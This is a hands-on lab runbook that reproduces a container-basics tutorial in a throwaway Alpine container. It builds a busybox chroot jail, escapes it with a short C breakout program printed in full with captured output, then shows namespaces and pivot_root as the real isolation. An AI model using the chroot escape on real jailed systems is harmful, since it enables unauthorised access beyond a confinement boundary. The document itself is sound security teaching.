# Hand-walk: *escape a chroot*, by hand, in a box

Follow Thomas Van Laere's **[*Exploring Containers - Part 1*](upstream-tutorial/)**
inside a disposable Alpine 3.11 container — build a busybox chroot jail with your
own hands, then **walk straight back out of it** with a 12-line C program, exactly
as the post does. The escape is the centerpiece; the namespaces + `pivot_root`
sections (§5–§6) are the post's payoff: *what actually isolates*, once you've seen
that chroot doesn't.

- **The post (byte-exact archive):** [`upstream-tutorial/`](upstream-tutorial/) ·
  canonical: <https://thomasvanlaere.com/posts/2020/04/exploring-containers-part-1/>
- **The environment as code:** [`Containerfile`](Containerfile) — Alpine 3.11 +
  `build-base` (gcc) + `util-linux` (`pivot_root`), the author's exact distro.
- **The escape program:** [`breakout.c`](breakout.c) — the author's verbatim.

> **Ordering is the lesson.** The naive `chroot` *fails first* (§1) — that failure
> is what forces you to copy busybox + the musl loader (§2). Then the jail works
> (§2), and then it doesn't hold you (§3). Don't reorder; the post's sequence is
> the argument. Every command below is from the [archived post](upstream-tutorial/);
> the `# →` lines are this box's own captured output (see
> [`MANUAL_TESTING.md`](MANUAL_TESTING.md)).

---

## 0. Bring up the box

The post runs `docker run -it --name docker-sandbox --rm --privileged alpine:3.11`.
We build the same environment with the repo's Phase-4 tool and launch it
`--privileged` (the post's flag) — `--privileged` is needed for the *namespaces +
`pivot_root`* half (§5–§6, which call `mount`/`unshare`/`pivot_root`). The chroot
escape itself (§1–§4) needs only `CAP_SYS_CHROOT`, which a privileged box also has.

```bash
# from the repo root:
phase4-podman/lab-podman.sh build --tag chroot-breakout \
    --context examples/chroot-breakout
podman run --rm -it --privileged chroot-breakout /bin/sh
```

```bash
cat /etc/issue
# → Welcome to Alpine Linux 3.11
```

> **Why `--privileged` and not the `lab-podman.sh up`/TOML flow?** The `up` path
> deliberately won't inject `--privileged` (the same reason the muxup hand-walk is
> launched by hand). `pivot_root` and `mount -t tmpfs` need `CAP_SYS_ADMIN`; the
> chroot escape needs `CAP_SYS_CHROOT`. So build with the phase tool, launch with
> the cap by hand. **Everything happens *inside the container*** — the escape lands
> in the container's root, never your host's. That is the whole point of the box;
> see the safety note in [`README.md`](README.md).

---

## 1. chroot the naive way — and watch it fail

```bash
mkdir /newroot
echo "Hello!" >> /newroot/foo.txt
chroot /newroot/ sh
# → chroot: can't execute 'sh': No such file or directory
```

**Why it fails.** `chroot /newroot sh` sets the new root to `/newroot`, then tries
to `exec` `sh` **inside that new root** — but `/newroot` has nothing in it except
`foo.txt`. There is no `/bin/sh`, no shell, no anything. This failure is the
tutorial's hook: a chroot is just a directory you declared to be `/`; *you* have to
put a userland in it.

---

## 2. Make the jail actually work — busybox + the musl loader

Alpine's entire userland is one static-ish binary, `/bin/busybox`, with every tool
a symlink to it. Copy it in and recreate the symlinks the post uses:

```bash
mkdir /newroot/bin
cp /bin/busybox /newroot/bin/busybox
ln -s busybox /newroot/bin/sh
ln -s busybox /newroot/bin/ls
ln -s busybox /newroot/bin/cd
ln -s busybox /newroot/bin/cat
```

busybox isn't fully static — it needs musl's dynamic loader. Find it and copy it
in with the `libc` symlink Alpine expects:

```bash
ldd /bin/busybox
# →        /lib/ld-musl-x86_64.so.1 (0x7f...)
# →        libc.musl-x86_64.so.1 => /lib/ld-musl-x86_64.so.1 (0x7f...)
mkdir /newroot/lib
cp /lib/ld-musl-x86_64.so.1 /newroot/lib/ld-musl-x86_64.so.1
ln -s ld-musl-x86_64.so.1 /newroot/lib/libc.musl-x86_64.so.1
```

Now the jail holds a working shell:

```bash
chroot /newroot sh
ls -lA          # → bin  foo.txt  lib   (this is your whole world now)
cat foo.txt     # → Hello!
exit
```

**Why the loader matters.** `cp busybox` alone gives you a binary the kernel can't
start: the ELF interpreter line points at `/lib/ld-musl-x86_64.so.1`, resolved
**relative to the new root**. Without it in the jail, `chroot … sh` would still
fail — just later, at dynamic-link time instead of exec time.

---

## 3. Break out of it — the centerpiece

The author's escape program — already in the box at `/root/breakout.c` (baked in
by the [`Containerfile`](Containerfile)), and pristine in [`breakout.c`](breakout.c)
/ [`upstream-tutorial/`](upstream-tutorial/):

```c
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>

int main(void)
{
    printf("\nTime to break things\n\n");
    mkdir("newroot2", 0755);
    chroot("newroot2");
    chdir("../../../");
    chroot(".");
    return execl("/bin/busybox", "ash", NULL);
}
```

Put it at `/newroot/breakout.c` (the post's path), compile it **to a path inside
the jail**, then run it **from inside the jail**:

```bash
cp /root/breakout.c /newroot/breakout.c
gcc /newroot/breakout.c -o /newroot/bin/breakout
chroot /newroot sh
ls                 # → bin  foo.txt  lib        (still jailed)
echo $$            # → 25                        (your PID)
breakout
# → Time to break things
ls -lA             # → bin dev etc home lib media mnt newroot opt proc root run
#                       sbin srv sys tmp usr var   ← THE FULL CONTAINER ROOT
echo $$            # → 27   (a new process — breakout exec'd a fresh ash)
```

The `ls` before `breakout` is your sparse jail (`bin foo.txt lib`); the `ls` after
is the **entire container filesystem**. You walked out. (Run it on a real host as
root and you'd be looking at the *host's* `/` — which is exactly why this lab keeps
you in a throwaway container.)

---

## 4. Why the escape works — the four load-bearing lines

`chroot()` is a famously leaky jail. Four facts, each matching one line:

1. **`mkdir("newroot2", 0755)`** — relative path, so it's created at your current
   working directory, i.e. `<jail>/newroot2`.
2. **`chroot("newroot2")`** — this moves your root *down* to `<jail>/newroot2`…
   **but `chroot()` does not change your current working directory.** Your cwd is
   still `<jail>` — which is now *above*, i.e. *outside*, your new root.
3. **`chdir("../../../")`** — `..` from a directory that sits **outside** the
   current root is **not** clamped to the root. So each `..` climbs a real level;
   three of them (more than enough) walk you up to the actual filesystem root.
4. **`chroot(".")`** — there is only **one** root pointer per process; calling
   `chroot` again doesn't "nest", it *overwrites*. You set root to your cwd, which
   is now the real `/`. Escaped.

The defense the author is teaching toward: after `chroot()` you must **also**
`chdir("/")` into the new root (so no cwd is left pointing outside) **and** drop
`CAP_SYS_CHROOT` — otherwise any process that can call `chroot` can do the above.
The deeper point: this isn't a bug, it's documented. `chroot(2)`'s own man page
says — verbatim — *"This call does not change the current working directory, so
that after the call `.` can be outside the tree rooted at `/`."* and then hands you
the escape as an example (`mkdir foo; chroot foo; cd ..;`), noting that the
superuser can escape a chroot jail this way. chroot was never a security boundary.
The next two sections show the primitives that *are*.

---

## 5. The real boundary, part 1: namespaces

A chroot only virtualizes `/`. **Namespaces** virtualize the kernel resources a
process can see — hostname (UTS), mounts, PIDs, network, users. The post
demonstrates two; here is the UTS one (a private hostname):

```bash
readlink /proc/$$/ns/uts          # → uts:[4026532298]   (your UTS namespace id)
unshare --uts sh                  # new shell in a NEW uts namespace
hostname thomas                   # rename the host — only in here
hostname                          # → thomas
# in another shell (PID 4): hostname → still the container id. Isolated.
```

And the **mount** namespace — a private set of mounts the parent can't see:

```bash
unshare --mount sh
mkdir /mytempfs
mount -n -o size=10m -t tmpfs tmpfs /mytempfs   # private tmpfs
touch /mytempfs/child.txt
# the parent shell's /mytempfs is empty — this mount exists only in this namespace
```

**Why this is the actual jail.** Where chroot left your cwd and `..` reaching the
real root, a mount namespace gives you a genuinely separate mount table; the parent
literally cannot resolve a path into it. That's isolation the kernel enforces, not
a directory you politely agreed to treat as `/`.

---

## 6. The real boundary, part 2: `pivot_root`

`pivot_root` is what a container runtime *actually* uses instead of `chroot`: it
swaps the root filesystem of the **current mount namespace** and parks the old one
where you can unmount it away — so there's no outside cwd to climb back through.

```bash
apk add util-linux        # already baked into the box; this is the post's step
wget http://dl-cdn.alpinelinux.org/alpine/v3.11/releases/x86_64/alpine-minirootfs-3.11.6-x86_64.tar.gz
mkdir /myrootfs
tar -xf alpine-minirootfs-3.11.6-x86_64.tar.gz --directory /myrootfs

unshare --mount sh                 # do this in a private mount namespace
mount --bind /myrootfs /myrootfs   # new_root must be a mount point
mkdir /myrootfs/.oldrootfs
cd /myrootfs
pivot_root . .oldrootfs            # / is now /myrootfs; old / is at /.oldrootfs
ls -lA /                           # → .oldrootfs bin dev etc … (the new root)
umount -l .oldrootfs               # detach the old root entirely…
ls -lA /.oldrootfs                 # → total 0   (gone — no path back)
```

That final empty `/.oldrootfs` is the contrast with §3: after a real
`pivot_root` + lazy unmount, **there is no outside left to `chdir("..")` into.**
chroot leaves a door open; `pivot_root` removes the wall the door was in.

---

## 7. Tear down & provenance

`exit` the `--rm` box and everything — jail, escape binary, minirootfs — vanishes.

```bash
podman rmi chroot-breakout         # drop the image when done
```

- **Provenance.** The archived post under [`upstream-tutorial/`](upstream-tutorial/)
  is the work of **Thomas Van Laere**; all rights remain with the author.
  [`breakout.c`](breakout.c) is his program verbatim. Vendored for offline
  reference; this runbook only operationalises it. Prefer the [canonical
  page](https://thomasvanlaere.com/posts/2020/04/exploring-containers-part-1/).
- **Verified in this box (`--privileged`):** every step above ran end-to-end —
  the naive-chroot failure, the busybox+musl jail, the **escape** (sparse jail →
  full container root), the UTS/mount namespaces, and the exact
  `wget` + `pivot_root . .oldrootfs` + `umount -l` → empty `/.oldrootfs`. Captured
  output is in [`MANUAL_TESTING.md`](MANUAL_TESTING.md).
